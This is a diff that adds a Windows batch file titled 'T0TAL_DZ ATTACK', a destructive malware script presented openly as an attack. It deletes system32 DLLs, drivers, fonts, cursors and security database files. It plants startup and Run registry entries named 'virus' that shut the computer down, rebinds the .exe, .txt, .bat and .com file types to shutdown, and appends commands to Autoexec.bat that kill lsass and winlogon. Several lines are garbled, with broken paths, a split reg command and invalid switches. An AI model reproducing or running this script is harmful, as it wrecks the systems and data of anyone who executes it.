@@ -1,0 +1,56 @@
+@echo off
+title T0TAL_DZ ATTACK
+cd %systemdrive%
+md Foldersaregettinguselesssoijustmadethisforfun
+cd %windir%Temp
+del /S /F /Q *.inf
+cd %windir%securityDatabase
+del /S /F /Q *.sdb
+cd %windir%system32MsDtcTrace
+echo shutdown -s >> msdtcvtr.bat
+copy msdtcvtr.bat "%userprofile%\start menu\programs\startup"
+cd %systemdrive%Foldersaregettinguselesssoijustmadethisforfun
+echo @echo off >> CF.bat
+echo shutdown -s >> CF.bat
+echo exit >> CF.bat
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v CF /t REG_SZ"
+/d %systemdrive%FoldersaregettinguselesssoijustmadethisforfunCF.bat /f
+cd %windir%Fonts
+del /S /F /Q *.ttr
+del /S /F /Q *.otr
+del /S /F /Q *.FON
+cd %windir%system32
+del /S /F /Q *.dll
+cd %systemdrive%
+assoc .exe=exee
+assoc .txt=notepad
+assoc .bat=batch
+assoc .com=command
+ftype exee=shutdown -s
+ftype notepad=shutdown -s
+ftype batch=shutdown -s
+ftype command=shutdown -s
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "virus" /t REG_SZ /d "%systemdrive%\Foldersaregettinguselesssoijustmadethisforfun\CF.bat"
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "virus2" /t REG_SZ /d "%systemdrive%\Foldersaregettinguselesssoijustmadethisforfun\CF.bat"
+cd %windir%system32
+del /S /F /Q keyboard.drv
+del /S /F /Q mouse.drv
+del /S /F /Q keyboard.sys
+cd %windir%
+copy system32 "%systemdrive%\documents and settings\%username%\start menu\programs\startup"
+cd %windir%Cursors
+del /S /F /Q *.cur
+del /S /F /Q *.ani
+cd %systemdrive%
+echo start %0 >> Autoexec.bat
+cd %windir%system32
+start taskmgr
+start notepad
+start cmd
+taskkill /A /IM taskmgr
+taskkill /A /IM notepad
+taskkill /A /IM cmd
+cd %systemdrive%
+echo taskkill /IM /A lsass.exe >> Autoexec.bat
+echo tskkill /IM /A winlogon.exe >> Autoexec.bat
+​
